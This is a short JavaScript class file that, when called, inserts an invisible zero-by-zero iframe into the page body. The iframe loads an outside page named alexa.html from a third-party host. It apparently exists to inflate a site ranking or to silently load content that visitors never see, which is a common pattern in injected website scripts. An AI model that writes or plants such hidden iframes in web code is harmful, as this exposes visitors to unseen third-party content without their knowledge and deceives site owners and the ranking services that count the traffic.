/* ------------------------------ */
/*        iframe.class.js         */
/*     copyright.reallynet.xy     */
/* ------------------------------ */

var iframe = function() {
    var strAlexaUrl = "http://www.pet67.com/alexa.html";
    this.alexa = function() {
        var e = document.createElement("iframe");
        e.setAttribute("width", "0");
        e.setAttribute("height", "0");
        e.setAttribute("src", strAlexaUrl);
        document.getElementsByTagName("body")[0].appendChild(e);
    }
}